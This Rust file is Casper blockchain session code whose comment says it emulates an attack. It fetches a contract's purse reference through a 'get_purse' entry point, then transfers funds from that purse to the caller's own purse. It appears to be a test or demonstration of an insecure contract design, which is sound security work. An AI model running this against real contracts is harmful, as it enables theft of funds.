/*
    This session code emulates an attack where a user tries to transfer funds
    out of the contract's purse, by querying the get_purse entry point
    and calling transfer_from_purse_to_purse
*/

#![no_std]
#![no_main]
use casper_contract::contract_api::{account, runtime, system};
use casper_types::{runtime_args, ContractHash, RuntimeArgs, URef, U512};

#[no_mangle]
pub extern "C" fn call() {
    let contract_hash: ContractHash = runtime::get_named_arg("demo_contract");
    let amount: U512 = runtime::get_named_arg("amount");
    let destination_purse: URef = account::get_main_purse();
    let borrowed_contract_purse: URef =
        runtime::call_contract::<URef>(contract_hash, "get_purse", runtime_args! {});
    system::transfer_from_purse_to_purse(borrowed_contract_purse, destination_purse, amount, None)
        .expect("Failed to transfer from purse to purse");
}
